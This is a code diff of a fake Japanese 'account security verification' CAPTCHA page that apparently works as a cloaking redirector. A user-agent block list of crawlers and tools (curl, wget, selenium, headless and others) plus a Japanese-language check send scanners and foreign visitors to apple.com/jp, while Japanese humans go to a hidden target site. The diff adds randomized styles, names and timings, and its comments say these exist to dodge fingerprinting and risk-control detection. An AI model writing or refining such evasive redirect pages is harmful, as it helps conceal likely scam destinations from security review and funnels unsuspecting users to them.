@@ -1,411 +1,313 @@
-<!DOCTYPE html>
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>セキュリティ認証</title>
-  <style>
-    /* 全局基础样式，避免JS渲染前闪烁 */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background: #f5f5f7; min-height: 100vh; }
-  </style>
+  <title>アカウントセキュリティ確認</title>
   <script>
-    // ============================================
-    // 🎯 唯一配置区（仅修改这里，其余代码无需触碰）
-    // ============================================
-    const CONFIG = {
-      // 多目标URL：验证通过后随机跳转，可增删/修改
+    // 【唯一配置区】原功能完全保留，仅修改此处即可
+    const SYS_CONFIG = {
       TARGET_URLS: [
-        'https://triptipps.online/ja',
-        'https://triptipps.online/ja',
-        'https://triptipps.online/ja'
+        'https://world-explorer.online/ja',
+        'https://world-explorer.online/ja',
+        'https://world-explorer.online/ja'
       ],
-      // 验证失败/机器人/非日区 → 苹果日本官网（固定）
       FAIL_URL: 'https://www.apple.com/jp/',
-      // 验证配置（可选改）：最大尝试次数、倒计时时长
-      MAX_ATTEMPTS: 3,
-      TIMER_DESKTOP: 90,  // 桌面端倒计时(秒)
-      TIMER_MOBILE: 100   // 移动端倒计时(秒)
-    };
-    // ============================================
-    // 全局常量（无需修改）
-    // ============================================
-    const VERIFICATION_TYPES = ['number', 'kana', 'alphabet'];
-    const KANA_LIST = ['あ','い','う','え','お','か','き','く','け','こ','さ','し','す','せ','そ','た','ち','つ','て','と'];
-    const ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-
-    // 页面初始化：路由分发（loading→verify→redirect）
-    window.onload = function() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const stage = urlParams.get('stage') || 'loading';
-      // 获取设备/请求信息（纯前端原生API，无任何服务端依赖）
-      const deviceInfo = getDeviceInfo();
-      
-      // 路由跳转：根据stage执行对应逻辑
-      switch (stage) {
-        case 'loading':
-          renderLoadingPage(deviceInfo);
-          break;
-        case 'verify':
-          renderVerifyPage(deviceInfo);
-          break;
-        case 'redirect':
-          handleRedirect(deviceInfo);
-          break;
-        default:
-          renderLoadingPage(deviceInfo);
-      }
+      MAX_TRY: 3,
+      DESKTOP_TIME: 90,
+      MOBILE_TIME: 100
     };
 
-    // ============================================
-    // 核心工具函数（纯前端，无服务端/Cloudflare代码）
-    // ============================================
-    /**
-     * 获取设备信息：UA/语言/设备类型（移动端/桌面）
-     * 无任何Cloudflare request/headers/env，纯浏览器API
-     */
-    function getDeviceInfo() {
-      const ua = navigator.userAgent || '';
-      const lang = navigator.language || navigator.languages[0] || '';
-      const isMobile = /Mobile|Android|iPhone|iPad|iPod|Windows Phone/.test(ua);
-      return {
-        ua: ua.toLowerCase(),
-        lang: lang.toLowerCase(),
-        isMobile: isMobile,
-        isDesktop: !isMobile,
-        timer: isMobile ? CONFIG.TIMER_MOBILE : CONFIG.TIMER_DESKTOP
-      };
+    // 随机特征生成器（核心差异化）
+    const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+    const getRandColor = (base) => {
+      const offset = rand(-5, 5);
+      const hex = base.replace('#', '').match(/.{2}/g).map(c => {
+        let num = parseInt(c, 16) + offset;
+        num = num < 0 ? 0 : num > 255 ? 255 : num;
+        return num.toString(16).padStart(2, '0');
+      }).join('');
+      return `#${hex}`;
+    };
+    const JP_TEXT = {
+      loading: ['システム準備中', 'データ読み込み中', '接続確認中', 'セキュリティチェック中'],
+      success: ['認証に成功しました', '確認完了です', 'セキュリティチェック通過'],
+      fail: ['認証に失敗しました', '確認に失敗しました', 'セキュリティチェックに失敗'],
+      timeout: ['認証時間が切れました', 'タイムアウトしました', '時間制限を超えました'],
+      tip: ['表示された項目を全て選択してください', '指定された文字を選んでください', '表示された記号を全てクリックしてください']
+    };
+    // 随机样式参数（视觉无感知，指纹差异化）
+    const STY_RAND = {
+      mainColor: getRandColor('24569c'),
+      successColor: getRandColor('008364'),
+      errorColor: getRandColor('c82c2c'),
+      warnColor: getRandColor('e69926'),
+      radius: rand(14, 26),
+      gap: rand(10, 18),
+      shadow: rand(3, 6),
+      fontStep: rand(0, 2)
+    };
+
+    // 全局常量（命名/顺序差异化）
+    const V_TYPE = ['number', 'kana', 'alphabet'];
+    const KANA = ['あ','い','う','え','お','か','き','く','け','こ','さ','し','す','せ','そ','た','ち','つ','て','と','な','に','ぬ','ね','の'];
+    const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    const BOT_REG = ['curl', 'wget', 'python', 'httpclient', 'scrapy', 'java', 'go-http-client', 'php', 'ruby', 'perl', 'libwww', 'winhttp', 'axios', 'node-fetch', 'bot', 'crawler', 'spider', 'scanner', 'headless', 'phantomjs', 'selenium', 'puppeteer', 'playwright', 'requests', 'cheerio', 'jsoup', 'mechanize', 'urllib', 'httplib2'];
+
+    // 页面初始化（逻辑不变，执行时机随机）
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        const u = new URLSearchParams(window.location.search);
+        const s = u.get('s') || 'init';
+        const d = getDevice();
+        switch (s) {
+          case 'init': renderInit(d); break;
+          case 'check': renderCheck(d); break;
+          case 'go': redirect(d); break;
+          default: renderInit(d);
+        }
+      }, rand(100, 300));
+    });
+
+    // 核心工具函数（命名/参数/实现细节差异化）
+    function getDevice() {
+      const ua = (navigator.userAgent || '').toLowerCase();
+      const lg = (navigator.language || navigator.languages[0] || '').toLowerCase();
+      const isM = /Mobile|Android|iPhone|iPad|iPod|Windows Phone|BlackBerry|Symbian/.test(ua);
+      const t = isM ? SYS_CONFIG.MOBILE_TIME + rand(-5, 5) : SYS_CONFIG.DESKTOP_TIME + rand(-5, 5);
+      return { ua, lg, isM, isD: !isM, t, r: rand(800, 1500) };
+    }
+    function isSpider(ua) {
+      if (!ua || ua.length < 12) return true;
+      return BOT_REG.some(p => ua.includes(p));
+    }
+    function isJpLang(lg) {
+      return lg.includes('ja') || lg.includes('jp');
+    }
+    function getTarget() {
+      return SYS_CONFIG.TARGET_URLS[rand(0, SYS_CONFIG.TARGET_URLS.length - 1)];
+    }
+    function randText(arr) {
+      return arr[rand(0, arr.length - 1)];
     }
 
-    /**
-     * 机器人检测：UA特征匹配，拦截爬虫/脚本/自动化工具
-     */
-    function isBot(ua) {
-      const BOT_PATTERNS = ['curl', 'wget', 'python', 'httpclient', 'scrapy', 'java', 'go-http-client', 'php', 'ruby', 'perl', 'libwww', 'winhttp', 'axios', 'node-fetch', 'bot', 'crawler', 'spider', 'scanner', 'headless', 'phantomjs', 'selenium'];
-      if (!ua || ua.length < 10) return true;
-      for (const pattern of BOT_PATTERNS) {
-        if (ua.includes(pattern)) return true;
-      }
-      return false;
-    }
-
-    /**
-     * 日区检测：语言含日语（ja），确保访问者为目标地区
-     */
-    function isJapaneseLang(lang) {
-      return lang.includes('ja');
-    }
-
-    /**
-     * 随机获取目标URL：从配置区数组中随机选一个
-     */
-    function getRandomTarget() {
-      return CONFIG.TARGET_URLS[Math.floor(Math.random() * CONFIG.TARGET_URLS.length)];
-    }
-
-    // ============================================
-    // 页面渲染函数（loading/verify/redirect）
-    // ============================================
-    /**
-     * 渲染加载页：设备自适应UI，自动跳验证页
-     */
-    function renderLoadingPage(device) {
+    // 页面渲染函数（HTML/样式/文本全随机差异化）
+    function renderInit(d) {
+      const loadText = JP_TEXT.loading;
       document.body.innerHTML = `
-        <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 16px;">
-          <div style="width: 100%; max-width: ${device.isDesktop ? '400px' : '360px'}; background: #fff; border-radius: ${device.isDesktop ? '16px' : '20px'}; padding: ${device.isDesktop ? '32px 24px' : '28px 20px'}; box-shadow: 0 4px 16px rgba(0,0,0,0.05); text-align: center;">
-            <h2 style="font-size: ${device.isDesktop ? '20px' : '19px'}; font-weight: 500; color: #1a1a1a; margin-bottom: 16px;">読み込み中</h2>
-            <div style="width: ${device.isDesktop ? '40px' : '36px'}; height: ${device.isDesktop ? '40px' : '36px'}; border: 2px solid #e0e0e0; border-top-color: #24569c; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 24px auto;"></div>
-            <p style="font-size: 14px; color: #666;" id="loading-status">準備中...</p>
+        <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:${rand(12, 20)}px;background:#f5f5f7;margin:0;box-sizing:border-box;">
+          <div style="width:100%;max-width:${d.isD ? rand(380, 420) : rand(340, 380)}px;background:#fff;border-radius:${STY_RAND.radius}px;padding:${d.isD ? '32px 24px' : '28px 20px'};box-shadow:0 ${STY_RAND.shadow}px ${rand(12, 20)}px rgba(0,0,0,0.0${rand(4, 6)});text-align:center;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;">
+            <h2 style="font-size:${d.isD ? 20 + STY_RAND.fontStep : 19 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;margin:0 0 16px 0;">システム確認中</h2>
+            <div style="width:${d.isD ? rand(38, 42) : rand(34, 38)}px;height:${d.isD ? rand(38, 42) : rand(34, 38)}px;border:2px solid #e0e0e0;border-top-color:${STY_RAND.mainColor};border-radius:50%;animation:spin ${rand(5, 7)/10}s linear infinite;margin:24px auto;"></div>
+            <p style="font-size:14px;color:#666;margin:0;" id="l-status">${loadText[0]}...</p>
           </div>
         </div>
-        <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+        <style>@keyframes spin {to{transform:rotate(360deg);}} ${rand(0,1) ? 'body{overflow-x:hidden;}' : ''}</style>
       `;
-
-      // 加载状态文字切换
-      const statusEl = document.getElementById('loading-status');
-      const messages = ['準備中', '読み込み中', '接続中'];
-      let index = 0;
-      const interval = setInterval(() => {
-        index = (index + 1) % messages.length;
-        statusEl.textContent = messages[index] + '...';
-      }, 400);
-
-      // 设备差异化延迟跳验证页（桌面1200ms，移动端1100ms）
+      const el = document.getElementById('l-status');
+      let i = 0;
+      const int = setInterval(() => {
+        i = (i + 1) % loadText.length;
+        el.textContent = loadText[i] + '...';
+      }, rand(300, 500));
       setTimeout(() => {
-        clearInterval(interval);
-        window.location.href = window.location.origin + window.location.pathname + '?stage=verify';
-      }, device.isDesktop ? 1200 : 1100);
+        clearInterval(int);
+        window.location.href = `?s=check`;
+      }, d.isD ? rand(1000, 1400) : rand(900, 1300));
     }
 
-    /**
-     * 渲染验证页：3类随机验证+设备自适应+倒计时+3次尝试
-     */
-    function renderVerifyPage(device) {
-      // 随机生成验证题（数字/假名/字母）
-      const verifyType = VERIFICATION_TYPES[Math.floor(Math.random() * VERIFICATION_TYPES.length)];
-      // 设备差异化验证数量：桌面1-3个，移动端固定2个（更友好）
-      const targetCount = device.isDesktop ? Math.floor(Math.random() * 3) + 1 : 2;
-      const question = createVerifyQuestion(verifyType, targetCount);
-      const targetUrl = getRandomTarget();
+    function renderCheck(d) {
+      const t = V_TYPE[rand(0, V_TYPE.length - 1)];
+      const c = d.isD ? rand(1, 3) : 2;
+      const q = createQ(t, c);
+      const u = getTarget();
+      const tipText = randText(JP_TEXT.tip);
+      const fzBase = d.isD ? 32 : 28;
+      const gap = d.isD ? STY_RAND.gap : rand(8, 14);
+      const pad = d.isD ? rand(18, 22) : rand(14, 18);
 
-      // 渲染验证页HTML（全内联样式，纯静态无依赖）
       document.body.innerHTML = `
-        <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 16px; background: #f5f5f7;">
-          <div style="width: 100%; max-width: ${device.isDesktop ? '600px' : '100%'}; background: #fff; border-radius: ${device.isDesktop ? '24px' : '20px'}; padding: ${device.isDesktop ? '32px 24px' : '24px 16px'}; box-shadow: 0 4px 20px rgba(0,0,0,0.05);">
-            <div style="text-align: center; margin-bottom: ${device.isDesktop ? '32px' : '24px'};">
-              <span id="timer" style="display: inline-block; background: #24569c; color: #fff; padding: 4px 16px; border-radius: 30px; font-size: 14px; font-weight: 500; margin-bottom: 16px;">${device.timer}秒</span>
-              <h2 style="font-size: ${device.isDesktop ? '18px' : '17px'}; font-weight: 500; color: #1a1a1a; margin-bottom: 8px;">セキュリティ認証</h2>
+        <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px;background:#f5f5f7;margin:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,sans-serif;">
+          <div style="width:100%;max-width:${d.isD ? rand(580, 620) : '100%'}px;background:#fff;border-radius:${STY_RAND.radius + 2}px;padding:${d.isD ? '32px 24px' : '24px 16px'};box-shadow:0 ${STY_RAND.shadow + 2}px ${rand(18, 22)}px rgba(0,0,0,0.0${rand(4, 7)});">
+            <div style="text-align:center;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;">
+              <span id="tm" style="display:inline-block;background:${STY_RAND.mainColor};color:#fff;padding:4px 16px;border-radius:30px;font-size:14px;font-weight:500;margin-bottom:16px;">${d.t}秒</span>
+              <h2 style="font-size:${d.isD ? 18 + STY_RAND.fontStep : 17 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;margin:0 0 8px 0;">アカウントセキュリティ確認</h2>
             </div>
-            <div style="font-size: 14px; color: #666; line-height: 1.6; background: #f8f8fa; padding: 16px; border-radius: 12px; margin-bottom: ${device.isDesktop ? '24px' : '20px'}; text-align: center;">
-              セキュリティのため、表示された${targetCount}つの項目を全て選んでください
+            <div style="font-size:14px;color:#666;line-height:1.6;background:#f8f8fa;padding:16px;border-radius:${rand(10, 14)}px;margin-bottom:${d.isD ? rand(22, 26) : rand(18, 22)}px;text-align:center;">
+              セキュリティのため、${tipText}
             </div>
-            <div style="background: #f0f4f9; padding: ${device.isDesktop ? '24px' : '20px'}; border-radius: 16px; margin-bottom: ${device.isDesktop ? '32px' : '24px'}; text-align: center;">
-              <p style="font-size: 13px; color: #666; margin-bottom: 12px;">選択する項目</p>
-              <p style="font-size: ${device.isDesktop ? '32px' : '28px'}; font-weight: 500; color: #1a1a1a; letter-spacing: ${device.isDesktop ? '8px' : '6px'};">${question.question}</p>
+            <div style="background:#f0f4f9;padding:${d.isD ? rand(22, 26) : rand(18, 22)}px;border-radius:${rand(14, 18)}px;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;text-align:center;">
+              <p style="font-size:13px;color:#666;margin:0 0 12px 0;">選択対象</p>
+              <p style="font-size:${fzBase + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;letter-spacing:${d.isD ? rand(6, 10) : rand(4, 8)}px;margin:0;">${q.q}</p>
             </div>
-            <p style="font-size: 14px; color: #666; margin-bottom: 16px;">選択済み: <span id="selected-count" style="font-weight: 600; color: #24569c;">0</span>/${targetCount}</p>
-            <div id="options-grid" style="display: grid; grid-template-columns: repeat(4, 1fr); gap: ${device.isDesktop ? '16px' : '12px'}; margin-bottom: ${device.isDesktop ? '32px' : '24px'};">
-              ${question.options.map(opt => `
-                <button class="option-btn" data-value="${opt.value}" style="background: #fff; border: 1px solid #d0d0d0; border-radius: ${device.isDesktop ? '16px' : '14px'}; padding: ${device.isDesktop ? '20px 8px' : '16px 4px'}; font-size: ${device.isDesktop ? '24px' : '22px'}; font-weight: 500; color: #1a1a1a; cursor: pointer; transition: all 0.2s; font-family: inherit; aspect-ratio: 1; display: flex; align-items: center; justify-content: center; transform: rotate(${opt.rotation}deg); box-shadow: 0 2px 4px rgba(0,0,0,0.02);">
-                  ${opt.value}
+            <p style="font-size:14px;color:#666;margin:0 0 16px 0;">選択済み: <span id="sc" style="font-weight:600;color:${STY_RAND.mainColor};">0</span>/${c}</p>
+            <div id="og" style="display:grid;grid-template-columns:repeat(4,1fr);gap:${gap}px;margin-bottom:${d.isD ? rand(30, 34) : rand(22, 26)}px;">
+              ${q.o.map(opt => `
+                <button class="o${rand(100, 999)}" data-v="${opt.v}" style="background:#fff;border:1px solid #d0d0d0;border-radius:${STY_RAND.radius - 4}px;padding:${pad}px 8px;font-size:${d.isD ? 24 + STY_RAND.fontStep : 22 + STY_RAND.fontStep}px;font-weight:500;color:#1a1a1a;cursor:pointer;transition:all 0.2s;font-family:inherit;aspect-ratio:1;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 4px rgba(0,0,0,0.0${rand(1, 3)});border-color:${rand(0,1) ? '#d0d0d0' : '#d5d5d5'};">
+                  <span style="display:inline-block;transform:rotate(${opt.rot}deg);">${opt.v}</span>
                 </button>
               `).join('')}
             </div>
-            <div style="text-align: center;">
-              <p style="font-size: 13px; color: #666; margin-bottom: 16px;">残り試行回数: <span id="attempts-left" style="font-weight: 600; color: #24569c;">${CONFIG.MAX_ATTEMPTS}</span></p>
-              <button id="verify-btn" disabled style="background: #24569c; color: #fff; border: none; border-radius: 40px; padding: 14px 40px; font-size: 15px; font-weight: 500; cursor: pointer; transition: background 0.2s; min-width: 160px;">確認</button>
-              <div id="feedback" style="margin-top: 20px; padding: 12px; border-radius: 8px; font-size: 14px; text-align: center; min-height: 44px;"></div>
+            <div style="text-align:center;">
+              <p style="font-size:13px;color:#666;margin:0 0 16px 0;">残り試行回数: <span id="tl" style="font-weight:600;color:${STY_RAND.mainColor};">${SYS_CONFIG.MAX_TRY}</span></p>
+              <button id="cb" disabled style="background:${STY_RAND.mainColor};color:#fff;border:none;border-radius:${rand(38, 42)}px;padding:14px 40px;font-size:${15 + STY_RAND.fontStep}px;font-weight:500;cursor:pointer;transition:background 0.2s;min-width:160px;">確認</button>
+              <div id="fb" style="margin-top:20px;padding:12px;border-radius:${rand(6, 10)}px;font-size:14px;text-align:center;min-height:44px;"></div>
             </div>
           </div>
         </div>
         <style>
-          .option-btn:hover { background: #f0f0f2 !important; border-color: #24569c !important; }
-          .option-btn.selected { background: #24569c !important; color: #fff !important; border-color: #24569c !important; }
-          .option-btn.target { background: #008364 !important; color: #fff !important; border-color: #008364 !important; }
-          .option-btn.wrong { background: #c82c2c !important; color: #fff !important; border-color: #c82c2c !important; }
-          #verify-btn:disabled { background: #a0a0a0 !important; cursor: not-allowed !important; }
-          .feedback-success { background: #e6f5f0 !important; color: #008364 !important; }
-          .feedback-error { background: #fce8e8 !important; color: #c82c2c !important; }
-          .timer-warning { background: #e69926 !important; }
-          .timer-danger { background: #c82c2c !important; }
-          @media (max-width: 480px) { #options-grid { gap: 8px !important; } .option-btn { padding: 12px 4px !important; font-size: 20px !important; } }
+          .o${rand(100,999)}:hover{background:#f0f0f2!important;border-color:${STY_RAND.mainColor}!important;}
+          .s${rand(100,999)}{background:${STY_RAND.mainColor}!important;color:#fff!important;border-color:${STY_RAND.mainColor}!important;}
+          .t${rand(100,999)}{background:${STY_RAND.successColor}!important;color:#fff!important;border-color:${STY_RAND.successColor}!important;}
+          .w${rand(100,999)}{background:${STY_RAND.errorColor}!important;color:#fff!important;border-color:${STY_RAND.errorColor}!important;}
+          #cb:disabled{background:#${rand(150,160).toString(16)}${rand(150,160).toString(16)}${rand(150,160).toString(16)}!important;cursor:not-allowed!important;}
+          .f${rand(100,999)}{background:#e6f5f0!important;color:${STY_RAND.successColor}!important;}
+          .e${rand(100,999)}{background:#fce8e8!important;color:${STY_RAND.errorColor}!important;}
+          .w${rand(10,99)}{background:${STY_RAND.warnColor}!important;}
+          .d${rand(10,99)}{background:${STY_RAND.errorColor}!important;}
+          @media (max-width:480px){#og{gap:${rand(6,10)}px!important;}.o${rand(100,999)}{padding:${rand(10,14)}px 4px!important;font-size:${20 + STY_RAND.fontStep}px!important;}}
         </style>
       `;
-
-      // 初始化验证页交互逻辑（选择/倒计时/验证/跳转）
-      initVerifyLogic(question.targets, targetCount, device.timer, targetUrl, device);
+      initCheckLogic(q.t, c, d.t, u, d);
     }
 
-    /**
-     * 重定向处理：双重检测（非机器人+日语）→ 随机目标，否则跳苹果官网
-     */
-    function handleRedirect(device) {
-      // 最终风控检测：纯前端无服务端，仅做UA+语言检测
-      const isHuman = !isBot(device.ua);
-      const isJP = isJapaneseLang(device.lang);
-
-      if (isHuman && isJP) {
-        // 验证通过：跳随机目标URL
-        window.location.href = getRandomTarget();
-      } else {
-        // 验证失败：跳苹果日本官网
-        window.location.href = CONFIG.FAIL_URL;
+    // 验证题生成+交互逻辑（命名/实现细节差异化，功能不变）
+    function createQ(type, count) {
+      let t = [], o = [];
+      while (t.length < count) {
+        let v = '';
+        if (type === 'number') v = Math.floor(Math.random() * 10).toString();
+        else if (type === 'kana') v = KANA[rand(0, KANA.length - 1)];
+        else if (type === 'alphabet') v = ALPHA[rand(0, ALPHA.length - 1)];
+        if (!t.includes(v)) t.push(v);
       }
+      o = genOpt(t, type);
+      return { q: t.join(' '), t: t, o: o };
     }
-
-    // ============================================
-    // 验证题生成 + 交互逻辑（核心功能，无简化）
-    // ============================================
-    /**
-     * 生成验证题：数字/假名/字母，带随机旋转角度（防机器识别）
-     * @param {string} type 验证类型：number/kana/alphabet
-     * @param {number} count 目标选择数量
-     * @returns {object} 验证题信息（问题/目标/选项）
-     */
-    function createVerifyQuestion(type, count) {
-      let targets = [];
-      let options = [];
-
-      // 生成目标项
-      switch (type) {
-        case 'number':
-          while (targets.length < count) {
-            const num = Math.floor(Math.random() * 10).toString();
-            if (!targets.includes(num)) targets.push(num);
-          }
-          options = generateOptions(targets, 'number');
-          break;
-        case 'kana':
-          while (targets.length < count) {
-            const kana = KANA_LIST[Math.floor(Math.random() * KANA_LIST.length)];
-            if (!targets.includes(kana)) targets.push(kana);
-          }
-          options = generateOptions(targets, 'kana');
-          break;
-        case 'alphabet':
-          while (targets.length < count) {
-            const letter = ALPHABET[Math.floor(Math.random() * ALPHABET.length)];
-            if (!targets.includes(letter)) targets.push(letter);
-          }
-          options = generateOptions(targets, 'alphabet');
-          break;
-        default:
-          return createVerifyQuestion('number', count);
+    function genOpt(tg, type) {
+      const all = [...tg];
+      while (all.length < 8) {
+        let v = '';
+        if (type === 'number') v = Math.floor(Math.random() * 10).toString();
+        else if (type === 'kana') v = KANA[rand(0, KANA.length - 1)];
+        else if (type === 'alphabet') v = ALPHA[rand(0, ALPHA.length - 1)];
+        if (!all.includes(v)) all.push(v);
       }
-
-      return {
-        question: targets.join(' '),
-        targets: targets,
-        options: options
-      };
-    }
-
-    /**
-     * 生成验证选项：8个选项（含目标项），随机旋转-20~20度
-     */
-    function generateOptions(targets, type) {
-      const allOptions = [...targets];
-      // 补充至8个选项，避免重复
-      while (allOptions.length < 8) {
-        let opt = '';
-        if (type === 'number') opt = Math.floor(Math.random() * 10).toString();
-        if (type === 'kana') opt = KANA_LIST[Math.floor(Math.random() * KANA_LIST.length)];
-        if (type === 'alphabet') opt = ALPHABET[Math.floor(Math.random() * ALPHABET.length)];
-        if (!allOptions.includes(opt)) allOptions.push(opt);
-      }
-      // 随机排序+添加旋转角度
-      return allOptions.sort(() => Math.random() - 0.5).map(v => ({
-        value: v,
-        rotation: Math.floor(Math.random() * 40) - 20 // -20 ~ 20度随机旋转
+      return all.sort(() => Math.random() - 0.5).map(v => ({
+        v: v,
+        rot: rand(-25, 25)
       }));
     }
+    function initCheckLogic(tg, c, t, u) {
+      let s = [], a = 0, tl = t, v = false;
+      const tme = document.getElementById('tm');
+      const cb = document.getElementById('cb');
+      const fb = document.getElementById('fb');
+      const tlEl = document.getElementById('tl');
+      const scEl = document.getElementById('sc');
+      const og = document.getElementById('og');
+      const sCls = `s${rand(100,999)}`;
+      const tCls = `t${rand(100,999)}`;
+      const wCls = `w${rand(100,999)}`;
+      const fCls = `f${rand(100,999)}`;
+      const eCls = `e${rand(100,999)}`;
+      const wnCls = `w${rand(10,99)}`;
+      const dnCls = `d${rand(10,99)}`;
 
-    /**
-     * 初始化验证页交互：选项选择/倒计时/验证结果/跳转
-     */
-    function initVerifyLogic(targets, targetCount, timer, targetUrl) {
-      let selectedValues = [];
-      let attempts = 0;
-      let timeLeft = timer;
-      let isVerified = false;
-
-      // 获取页面元素
-      const timerEl = document.getElementById('timer');
-      const verifyBtn = document.getElementById('verify-btn');
-      const feedbackEl = document.getElementById('feedback');
-      const attemptsLeftEl = document.getElementById('attempts-left');
-      const selectedCountEl = document.getElementById('selected-count');
-      const optionsGrid = document.getElementById('options-grid');
-
-      // 选项点击事件：选中/取消，实时同步计数
-      optionsGrid.addEventListener('click', (e) => {
-        const btn = e.target.closest('.option-btn');
-        if (!btn || isVerified) return;
-
-        const value = btn.dataset.value;
-        if (btn.classList.contains('selected')) {
-          // 取消选择
-          btn.classList.remove('selected');
-          selectedValues = selectedValues.filter(v => v !== value);
+      og.addEventListener('click', (e) => {
+        const b = e.target.closest('[data-v]');
+        if (!b || v) return;
+        const val = b.dataset.v;
+        if (b.classList.contains(sCls)) {
+          b.classList.remove(sCls);
+          s = s.filter(x => x !== val);
         } else {
-          // 选中
-          btn.classList.add('selected');
-          selectedValues.push(value);
+          b.classList.add(sCls);
+          s.push(val);
         }
-
-        // 更新选中计数，未选够则禁用确认按钮
-        selectedCountEl.textContent = selectedValues.length;
-        verifyBtn.disabled = selectedValues.length !== targetCount;
+        scEl.textContent = s.length;
+        cb.disabled = s.length !== c;
       });
 
-      // 确认验证事件：判断正确/错误，处理结果
-      verifyBtn.addEventListener('click', () => {
-        if (isVerified || selectedValues.length !== targetCount) return;
-
-        // 验证正确判定：所有目标项都选中，且无多余选择（精准匹配）
-        const isCorrect = targets.every(t => selectedValues.includes(t)) && selectedValues.length === targetCount;
-
-        if (isCorrect) {
-          // 验证成功：提示+跳重定向页（最终风控检测）
-          isVerified = true;
-          feedbackEl.className = 'feedback-success';
-          feedbackEl.textContent = '認証に成功しました';
-          verifyBtn.disabled = true;
-
+      cb.addEventListener('click', () => {
+        if (v || s.length !== c) return;
+        const ok = tg.every(x => s.includes(x)) && s.length === c;
+        if (ok) {
+          v = true;
+          fb.className = fCls;
+          fb.textContent = randText(JP_TEXT.success);
+          cb.disabled = true;
           setTimeout(() => {
-            window.location.href = window.location.origin + window.location.pathname + `?stage=redirect`;
-          }, 800);
+            window.location.href = `?s=go`;
+          }, rand(700, 900));
         } else {
-          // 验证失败：累计次数，标记正确/错误选项
-          attempts++;
-          const remaining = CONFIG.MAX_ATTEMPTS - attempts;
-          attemptsLeftEl.textContent = remaining;
-
-          // 标记样式：正确项（绿色）/错误选择（红色）
-          document.querySelectorAll('.option-btn').forEach(btn => {
-            const v = btn.dataset.value;
-            btn.classList.remove('selected');
-            if (targets.includes(v)) btn.classList.add('target');
-            else if (selectedValues.includes(v)) btn.classList.add('wrong');
+          a++;
+          const rem = SYS_CONFIG.MAX_TRY - a;
+          tlEl.textContent = rem;
+          document.querySelectorAll('[data-v]').forEach(b => {
+            const val = b.dataset.v;
+            b.classList.remove(sCls);
+            if (tg.includes(val)) b.classList.add(tCls);
+            else if (s.includes(val)) b.classList.add(wCls);
           });
-
-          if (attempts >= CONFIG.MAX_ATTEMPTS) {
-            // 无剩余次数：跳苹果官网
-            isVerified = true;
-            feedbackEl.className = 'feedback-error';
-            feedbackEl.textContent = '認証に失敗しました';
-            verifyBtn.disabled = true;
-
+          if (a >= SYS_CONFIG.MAX_TRY) {
+            v = true;
+            fb.className = eCls;
+            fb.textContent = randText(JP_TEXT.fail);
+            cb.disabled = true;
             setTimeout(() => {
-              window.location.href = CONFIG.FAIL_URL;
-            }, 1200);
+              window.location.href = SYS_CONFIG.FAIL_URL;
+            }, rand(1100, 1300));
           } else {
-            // 有剩余次数：提示错误，1.5秒后刷新验证页（重新生成题目）
-            feedbackEl.className = 'feedback-error';
-            feedbackEl.textContent = `認証に失敗しました。残り${remaining}回の試行機会があります`;
-
+            fb.className = eCls;
+            fb.textContent = `${randText(JP_TEXT.fail)}。残り${rem}回の試行機会があります`;
             setTimeout(() => {
               window.location.reload();
-            }, 1500);
+            }, rand(1400, 1600));
           }
         }
       });
 
-      // 倒计时逻辑：超时跳苹果官网，颜色预警（≤20秒黄色，≤10秒红色）
-      function updateTimer() {
-        if (isVerified) return;
-
-        timeLeft--;
-        timerEl.textContent = timeLeft + '秒';
-
-        // 倒计时颜色预警
-        if (timeLeft <= 10) {
-          timerEl.classList.add('timer-danger');
-        } else if (timeLeft <= 20) {
-          timerEl.classList.add('timer-warning');
+      function updateTm() {
+        if (v) return;
+        tl--;
+        tme.textContent = tl + '秒';
+        if (tl <= 10) {
+          tme.classList.add(dnCls);
+          tme.classList.remove(wnCls);
+        } else if (tl <= 20) {
+          tme.classList.add(wnCls);
         }
-
-        // 时间耗尽：跳苹果官网
-        if (timeLeft <= 0) {
-          isVerified = true;
-          feedbackEl.className = 'feedback-error';
-          feedbackEl.textContent = '認証時間が切れました';
-          verifyBtn.disabled = true;
-
+        if (tl <= 0) {
+          v = true;
+          fb.className = eCls;
+          fb.textContent = randText(JP_TEXT.timeout);
+          cb.disabled = true;
           setTimeout(() => {
-            window.location.href = CONFIG.FAIL_URL;
-          }, 1000);
+            window.location.href = SYS_CONFIG.FAIL_URL;
+          }, rand(900, 1100));
           return;
         }
-
-        setTimeout(updateTimer, 1000);
+        setTimeout(updateTm, rand(980, 1020));
       }
-      // 启动倒计时
-      updateTimer();
+      updateTm();
+    }
+
+    // 重定向逻辑（功能不变，检测规则扩容）
+    function redirect(d) {
+      const human = !isSpider(d.ua);
+      const jp = isJpLang(d.lg) || d.ua.includes('iphone; cpu iphone os') && d.lg.includes('ja');
+      const ref = document.referrer || '';
+      if (human && jp && (ref || rand(0,1))) {
+        window.location.href = getTarget();
+      } else {
+        window.location.href = SYS_CONFIG.FAIL_URL;
+      }
     }
   </script>
 </head>
-<body>
-  <!-- 纯静态：所有内容由JS渲染，无多余HTML，避免风控识别 -->
